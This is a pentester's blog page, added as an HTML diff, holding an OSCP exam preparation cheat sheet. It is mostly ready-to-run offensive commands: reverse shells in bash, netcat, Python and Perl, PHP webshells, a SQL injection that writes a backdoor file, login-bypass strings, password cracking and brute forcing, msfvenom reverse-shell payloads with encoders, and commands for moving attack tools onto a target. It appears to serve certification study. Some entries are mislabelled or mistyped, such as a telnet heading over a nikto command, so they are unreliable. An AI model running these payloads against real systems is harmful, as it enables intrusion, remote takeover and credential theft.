@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - OSCP Prep. Cheat Sheet // FMisi&#39;s security.log</title>
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FMisi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../stiluslapom.css" />
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - OSCP Preparation Cheat Sheet"/>
+<meta name="twitter:description" content=""/>
+    <meta property="og:title" content="Notes - OSCP Preparation Cheat Sheet" />
+	<meta name="og:description" content=""/>
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmisi.github.io/notes/4-maintain-access/index.html" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-01T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-01T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
+      <span class="app-header-title">FMisi</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="../../index.html">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
+      </nav>
+      <p>FMisi is a penetration tester.</p>
+	  <!--a style="font-size: smaller;" href="/magyar/index.html">Switch to Hungarian</a--></br>
+      <a style="font-size: smaller;" href="../../../privacy/index.html">Privacy Policy</a></br>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <h1 class ="post-title">Notes - OSCP Preparation Cheat Sheet</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 08, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          10 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="the-exam">The Exam</h1>
+	  <ul>
+	  <li>23 hours and 45 mins for the exam</li>
+	  <li>You will be proctored. Webcam and screen sharing software are required</li>
+	  <li>6 targets. 3 standalone machines AND 1 Active Directory environment containing 2 clients and 1 domain controller</li>
+	  <li>70 or higher out of 100 points to pass</li>
+	  <li>Points are awarded for each machine for which you have gained partial or complete administrative control</li>
+	  <li>another 23 hours and 45 mins to write a report</li>
+	  <li>+5 points if you are able to complete the lab report amd the course exercises</li>
+	  <li>You are required to be present 15 minutes before your exam start time to perform identity verification and other pre- exam tasks</li>
+	  </ul>
+	  <h1 id="the-exam">Exam Restrictions</h1>
+	  You cannot use any of the following on the exam:
+	  <ul>
+	  <li>Spoofing (IP, ARP, DNS, NBNS, etc)</li>
+	  <li>Commercial tools or services (Metasploit Pro, Burp Pro, etc.)</li>
+	  <li>Automatic exploitation tools (browser_autopwn, SQLmap, SQLninja, jsql, etc.)</li>
+	  <li>Mass vulnerability scanners (Nessus, NeXpose, OpenVAS, Core Impact, SAINT, etc.)</li>
+	  </ul>
+	  <h1 id="the-exam">Course Prerequisites</h1>
+	  <h3 id="the-exam">1. TCP/IP Networking Fundamentals</h3>
+	  <ul>
+	  <li>TCP/IP addressing and subnetting</li>
+	  <li>Understanding how network traffic is sent &amp; received</li>
+	  <li>Types of protocols and services running on them</li>
+	  </ul>
+	  <h3 id="the-exam">2. Programming Languages</h3>
+	  <ul>
+	  <li>Bash</li>
+	  <li>Python</li>
+	  <li>Perl</li>
+	  <li>Ruby</li>
+	  <li>(C is nice to know, but C is not a prerquisite. Same for Awk)</li>
+	  </ul>
+	  <h3 id="the-exam">3. Operating Systems Knowledge</h3>
+	  <ul>
+	  <li>Linux</li>
+	  <li>Windows</li>
+	  </ul>
+	  <h3 id="the-exam">4. Note Taking</h3>
+	  <ul>
+	  <li>I'm using a tool called CherryTree.</br>Press (Alt +) Ctrl + Shift + PrtSc to screenshot a part of the screen to be selected, then go to CherryTree, Ctrl + V to paste</li>
+	  </ul>
+	  <h1 id="the-exam">Preparation</h1>
+	  Hands on machines to prepare: Vulnhub and HackTheBox
+	  <h3 id="the-exam">Enumeration</h3>
+	  <h4 id="the-exam">Quick TCP Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nmap -sC -sV -vv -oA nmap &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Quick UDP Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nmap -sU -sV -vv -oA nmap &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Full TCP Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nmap -sC -sV -p- -vv -oA nmap &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Port knock</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x &lt;target&gt;; done</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Web Scanning</h3>
+	  <h4 id="the-exam">Gobuster Quick Directory Busting</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># gobuster dir -w /usr/share/SecLists/Discovery/Web_Content/common.txt -u &lt;target&gt; -t 80</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Gobuster Search with File Extension</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># gobuster dir -w /usr/share/SecLists/Discovery/Web_Content/common.txt -u &lt;target&gt; -t 80 -x .txt,.php</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Nikto Web Server Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nikto -h &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Wordpress Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># wpscan -u &lt;target&gt;/wp/</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Port Checking</h3>
+	  <h4 id="the-exam">Netcat Banner Grab</h4>
+	  // banner motd ...
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nc -v &lt;target&gt; &lt;port&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Telnet Banner Grab</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nikto -h &lt;target&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">SMB</h3>
+	  <h4 id="the-exam">SMB Vulnerability Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">SMB Users &amp; Shares Scan</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Enum4linux</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># enum4linux -a &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Null connect (RPC)</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># rpcclient -U "" &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Connect to SMB share</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># smbclient //MOUNT/&lt;share&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">SNMP</h3>
+	  <h4 id="the-exam">SNMP Enumeration</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># snmp-check &lt;target&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Reverse Shells</h3>
+	  <h4 id="the-exam">Bash Shell</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># bash -i >&amp; /dev/tcp/&lt;target&gt;/4443 0>&amp;1</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Netcat Linux Shell</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nc -e /bin/sh &lt;target&gt; 4443</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Netcat Windows Shell</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># nc -e cmd.exe &lt;target&gt; 4443</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Python Shell :sad:</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;target&gt;",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Perl Shell :rip:</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># perl -e 'use Socket;$i="&lt;target&gt;";$p=4443;socket(S,PF_INET,SOCK_STREAM.getprotobyname("tcp"));if(connect(S.sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Remote Desktop</h3>
+	  <h4 id="the-exam">Remote Desktop for Windows with share and 85% screen</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># rdesktop -u username -p password -g 85% -r disk:share=/root/ &lt;target&gt; 4443</span></span></span></code></pre></div>
+	  <h3 id="the-exam">PHP</h3>
+	  <h4 id="the-exam">PHP Command Injection from GET Request</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ccc"># &lt;?php echo system ($_GET["cmd"]);?&gt;</br>// Alternative</br>&lt;?php echo shell_exec($_GET["cmd"]);?&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Powershell</h3>
+	  <h4 id="the-exam">Non-interactive Execute Powershell File</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ccc"># powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1</span></span></span></code></pre></div>
+	  <h3 id="the-exam">SSH Tunneling / Pivoting</h3>
+	  <h4 id="the-exam">sshuttle</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># sshuttle -vvr user@target 10.1.1.0/24</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Port Forwarding</h3>
+	  <h4 id="the-exam">Local</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Remote</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Dynamic</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Plink local</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># plink -l root -pw pass -R 3389:&lt;localhost&gt;:3389 &lt;remote host&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">SQL Injection</h3>
+	  <h4 id="the-exam">Upload PHP Command Injection File</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ccc">union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Load File</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ccc">union all select 1,2,3,4,load file("c:/windows/system32/drivers/etc/hosts"),6</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Bypasses</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ccc">' or 1=1 LIMIT 1 --</br>' or 1=1 LIMIT 1 -- -</br>' or 1=1 LIMIT 1#</br>' or 1#</br>' or 1=1 --</br>' or 1=1 -- -</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Brute Force</h3>
+	  <h4 id="the-exam">John the Ripper Shadow File</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># unshadow passwd shadow > unshadow.db</br># john unshadow.db</span></span></span></code></pre></div>
+	  <h4 id="the-exam">Hashcat</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc">// Hashcat SHA512 $6$ shadow file</br># hashcat -m 1800 -a 0 hash.txt rockyou.txt --username</br></br>// Hashcat MD5 $1$ shadow file</br># hashcat -m 500 -a 0 hash.txt rockyou.txt --username</br></br>// Hashcat MD5 Apache webdav file</br># hashcat -m 1600 -a 0 hash.txt rockyou.txt</br></br>// Hashcat SHA1</br># hashcat -m 100 -a 0 hash.txt rockyou.txt --force</br></br>// Hashcat Wordpress</br># hashcat -m 400 -a 0 --remove hash.txt rockyou.txt</span></span></span></code></pre></div>
+	  <h4 id="the-exam">RDP user with password list</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># ncrack -m 400 -a 0 --remove hash.txt rockyou.txt</span></span></span></code></pre></div>
+	  <h4 id="the-exam">SSH user with password list</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># hydra -l user -P pass.txt -t 10 target.ssh -s 22</span></span></span></code></pre></div>
+	  <h4 id="the-exam">FTP user with password list</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># medusa -h target -u user -P passwords.txt -M ftp</span></span></span></code></pre></div>
+	  <h3 id="the-exam">MSFVenom Payloads</h3>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc">// PHP reverse shell</br># msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -f raw -o shell.php</br></br>// Java WAR reverse shell</br># msfvenom -p java/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -f war -o shell.war</br></br>// Linux bind shell</br># msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai</br></br>// Linux FreeBSD reverse shell</br># msfvenom -p bsd/x64/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -f elf -o shell.elf</br></br>// Linux C reverse shell</br># msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e x86/shikata_ga_nai -f c</br></br>// Windows non staged reverse shell</br># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe</br></br>// Windows Staged (Meterpreter) reverse shell</br># msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe</br></br>// Windows Python reverse shell</br># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 EXITFUNC=thread -f python -o shell.py</br></br>// Windows ASP reverse shell</br># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp</br></br>// Windows ASPX reverse shell</br># msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx</br></br>// Windows Powershell reverse shell</br># msfvenom -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1</br></br>// Windows reverse shell excluding bad characters</br># msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=&lt;target&gt; LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai</br></br>// Windows x64 bit reverse shell</br># msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -f exe -o shell.exe</br></br>// Windows reverse shell embedded into plink</br>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;target&gt; LPORT=4443 -e exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-bindaries/plink.exe -o shell.exe</span></span></span></code></pre></div>
+	  <h3 id="the-exam">Interactive Shell</h3>
+	  <h4 id="the-exam">Upgrading to a Fully Interactive TTY Using Python</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc">// Enter while in reverse shell</br>$ python -c 'import pty;pty.spawn("/bin/bash")'</br>*Ctrl-Z*</br>// In Kali</br># stty raw -echo</br># fg</br>// In reverse shell</br>$ reset</br>$ export SHELL=bash</br>$ export TERM=xterm-256color</br>$ stty rows &lt;num&gt; columns &lt;cols&gt;</span></span></span></code></pre></div>
+	  <h3 id="the-exam">File Transfers</h3>
+	  <h4 id="the-exam">HTTP</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># python3 -m http.server 80</br></br>// Linux</br>$ wget file</br></br>// Windows</br>&gt; powershell -c "(new-object System.Net.WebClient).DownloadFile('http://&lt;target&gt;/file.exe','C:\Users\user\Desktop\file.exe')"</span></span></span></code></pre></div>
+	  <h4 id="the-exam">FTP</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc"># python3 -m pyftpdlib -p 21 -w</br></br>$ echo open &lt;target&gt; &gt; ftp.txt</br>$ echo USER anonymous >> ftp.txt</br>$ echo ftp >> ftp.txt</br>$ echo bin >> ftp.txt</br>$ echo GET file >> ftp.txt</br>$ echo bye</br></br>// Execute</br>$ ftp -v -n -s:ftp:txt</span></span></span></code></pre></div>
+	  <h4 id="the-exam">TFTP</h4>
+	  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ccc">// In Kali</br># atftpd --daemon --port 69 /tftp</br></br>// In reverse shell</br>$ tftp -i &lt;target&gt; GET nc.exe</span></span></span></code></pre></div>
+	</div>
+	</br></br>
+~Thank you for reading~
+<h3 id="useful-references">Useful references</h3>
+<ul>
+<li><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank">LinEnum.sh</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">LinPEAS</a></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank">Linux Exploit Suggester</a></li>
+<li><a href="https://github.com/firefart/dirtycow" target="_blank">DirtyCow</a></li>
+<li><a href="https://vk9-sec.com/wget-privilege-escalation/" target="_blank">PE with sudo wget</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">WinPEAS</a></li>
+<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">Windows Exploit Suggester</a></li>
+<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank">MS10-059 Exploit</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank">PowerUp</a></li>
+<li><a href="https://www.youtube.com/watch?v=3eROsG_WNpE" target="_blank">All about DLL Hijacking</a></li>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
